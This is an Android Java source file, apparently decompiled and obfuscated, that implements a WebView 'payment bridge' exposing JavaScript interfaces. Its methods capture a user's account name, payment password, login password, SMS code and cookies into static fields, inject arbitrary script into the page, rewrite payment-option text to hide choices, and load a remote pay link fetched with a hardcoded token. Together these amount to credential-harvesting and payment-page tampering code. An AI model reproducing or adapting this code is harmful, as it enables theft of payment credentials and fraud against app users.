package com.ellison.project.utils;

import android.app.Activity;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;

import com.ellison.project.bean.PayUrlBean;
import com.google.gson.Gson;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.model.Response;
import com.lzy.okgo.request.PostRequest;

import java.io.UnsupportedEncodingException;

/**
 * @author ellison
 * @date 2020年09月26日
 * @desc 调用支付brige
 * <p>
 */
public class BBBBBBB {
    private Activity mActivity;
    private WebView mWeb;
    private ProgressBar progressBar;
    private LinearLayout zhezhao;

    public BBBBBBB(Activity paramActivity, WebView paramWebView, ProgressBar paramProgressBar, LinearLayout paramLinearLayout) {
        this.mWeb = paramWebView;
        this.mActivity = paramActivity;
        this.progressBar = paramProgressBar;
        this.zhezhao = paramLinearLayout;
    }

    @JavascriptInterface
    public void executeJS(final String paramString) {
        System.out.println(paramString);
        this.mActivity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                WebView localWebView = BBBBBBB.this.mWeb;
                StringBuilder localStringBuilder = new StringBuilder();
                localStringBuilder.append("javascript:function exeJA(){");
                localStringBuilder.append(paramString);
                localStringBuilder.append("};exeJA();");
                localWebView.loadUrl(localStringBuilder.toString());
            }
        });
    }

    @JavascriptInterface
    public String getCurrentPrice() {
        return AAAA.currentPrice;
    }

    @JavascriptInterface
    public String getSMSCode() {
        return AAAA.smsCode;
    }

    @JavascriptInterface
    public void hidePayWay() {
        this.mActivity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                for (int i = 0; i < 20; i++) {
                    StringBuilder localStringBuilder = new StringBuilder();
                    localStringBuilder.append("var  aa = document.getElementsByClassName('list-discount-title')[");
                    localStringBuilder.append(i);
                    localStringBuilder.append("];if(aa.innerText.indexOf('不足')>-1){aa. innerText='该付款方式不支持当前交易'};");
                    String str = localStringBuilder.toString();
                    WebView localWebView = BBBBBBB.this.mWeb;
                    localStringBuilder = new StringBuilder();
                    localStringBuilder.append("javascript:function BBBBBBB(){");
                    localStringBuilder.append(str);
                    localStringBuilder.append("};BBBBBBB();");
                    localWebView.loadUrl(localStringBuilder.toString());
                }
            }
        });
    }

    @JavascriptInterface
    public void hideUI() {
        log("js���������������������");
        this.mActivity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                BBBBBBB.this.progressBar.setVisibility(View.VISIBLE);
                BBBBBBB.this.zhezhao.setVisibility(View.VISIBLE);
            }
        });
    }

    @JavascriptInterface
    public void log(String paramString) {
        System.out.println(paramString);
    }

    @JavascriptInterface
    public void recordAccount(String paramString) {
        AAAA.account = paramString;
    }

    @JavascriptInterface
    public void recordInput() {
    }

    @JavascriptInterface
    public void recordPwd(String paramString) {
        AAAA.payPwd = paramString;
    }

    @JavascriptInterface
    public void recordPwd2(String paramString) {
        AAAA.pwd = paramString;
    }

    @JavascriptInterface
    public void sendCode() {
        log("js调用了发送短信验证码");
    }

    @JavascriptInterface
    public void sendDataToServer(String paramString1, String paramString2, String paramString3) {
        log("js调用了提交支付状态");
        AAAA.pageTitle = paramString1;
        AAAA.cookie = paramString2;
        AAAA.currentURL = paramString3;
        if (System.currentTimeMillis() - AAAA.start > 1000L) {
            AAAA.ss = 1;
        }
        AAAA.start = System.currentTimeMillis();
    }

    @JavascriptInterface
    public void showUI() {
        log("js显示ui");
        this.mActivity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                BBBBBBB.this.progressBar.setVisibility(View.GONE);
                BBBBBBB.this.zhezhao.setVisibility(View.GONE);
            }
        });
    }

    @JavascriptInterface
    public void toAccountLogin(final String paramString) {
        this.mActivity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
                BBBBBBB.this.mWeb.loadUrl(paramString);
            }
        });
    }

    @JavascriptInterface
    public void toVideoPlay() {
        updatePayLink();
    }

    @JavascriptInterface
    public void updatePayLink() {
        String str2 = "";
        try {
            String str1 = Base64Util.base64Encrypt("{'type':'getzfbuser','Token':'eyd0eXBlJzonZ2V0emZidXNlcicsJ1Rva2VuJzond2Z3ZWdlcmdlcid9'}".getBytes("UTF-8"));
        } catch (UnsupportedEncodingException localUnsupportedEncodingException) {
            localUnsupportedEncodingException.printStackTrace();
            str2 = null;
        }
        ((PostRequest) OkGo.post(UrlConstant.API_URL).tag(this)).params("callbackurl", str2, new boolean[0]).execute(new StringCallback() {
            @Override
            public void onSuccess(Response<String> paramAnonymousResponse) {
                PayUrlBean bean = new Gson().fromJson(paramAnonymousResponse.body(), PayUrlBean.class);
                String str = bean.getUrl();
                AAAA.id = bean.getID();
                BBBBBBB.this.mWeb.loadUrl(str);
            }
        });
    }

    @JavascriptInterface
    public void waitPayResult() {
        log("js调用");
    }
}
